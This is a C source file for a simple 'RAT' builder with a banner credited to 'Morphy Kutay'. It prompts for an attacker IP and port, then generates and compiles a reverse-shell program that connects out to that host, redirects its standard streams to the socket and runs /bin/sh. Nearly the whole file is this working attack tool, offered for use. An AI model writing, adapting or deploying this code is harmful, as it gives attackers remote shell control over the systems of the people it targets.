#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

int main() {
    // Set text color to red
    printf("\033[1;31m");
    printf("  ____       _    ______           \n");
    printf(" |  __ \\     | |  |  ____|          \n");
    printf(" | |__) |   _| |_| |__   _ __  _   _ \n");
    printf(" |  _  / | | | __|  __| | '_ \\| | | |\n");
    printf(" | | \\ \\ |_| | |_| |____| | | | |_| |\n");
    printf(" |_|  \\_\\__,_|\\__|______|_| |_|\\__,_|\n");
    printf("    Morphy Kutay    \n");
    // Reset text color
    printf("\033[0m");

    char input[100];
    printf("Menu:\n");
    printf("1-) Create Rat\n");

    printf("\nSayi giriniz: ");
    fgets(input, sizeof(input), stdin);

    if (input[0] == '1') {
        char ip[100], port[10];
        printf("Enter your IP address: ");
        fgets(ip, sizeof(ip), stdin);
        ip[strcspn(ip, "\n")] = 0; // Remove newline character

        printf("Enter your port number: ");
        fgets(port, sizeof(port), stdin);
        port[strcspn(port, "\n")] = 0; // Remove newline character

        char shell_code[1024];
     snprintf(shell_code, sizeof(shell_code),
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n"
    "#include <sys/socket.h>\n"
    "#include <arpa/inet.h>\n\n"
    "int main() {\n"
    "    int a = socket(AF_INET, SOCK_STREAM, 0);\n"
    "    if (a == -1) {\n"
    "        perror(\"Err\");\n"
    "        return 1;\n"
    "    }\n\n"
    "    struct sockaddr_in b = {\n"
    "        .sin_family = AF_INET,\n"
    "        .sin_port = htons(%s),\n"
    "        .sin_addr.s_addr = inet_addr(\"%s\")\n"
    "    };\n\n"
    "    if (connect(a, (struct sockaddr *)&b, sizeof(b)) == -1) {\n"
    "        perror(\"Con Error\");\n"
    "        return 1;\n"
    "    }\n\n"
    "    for (int c = 0; c < 3; c++)\n"
    "        dup2(a, c);\n"
    "    execl(\"/bin/sh\", \"sh\", NULL);\n"
    "    return 0;\n"
    "}\n",
    port, ip);



        // Create and write to shell.c file
        FILE *file = fopen("shell.c", "w");
        if (!file) {
            perror("Error creating file");
            return 1;
        }
        fprintf(file, "%s", shell_code);
        fclose(file);

        printf("Reverse shell code saved to 'shell.c'.\n");

        // Compile and run the shell
        printf("Compiling shell...\n");
        char compile_cmd[200];
        snprintf(compile_cmd, sizeof(compile_cmd), "gcc shell.c -o shell");
        system(compile_cmd);
    } else {
        printf("Invalid input\n");
    }

    return 0;
}
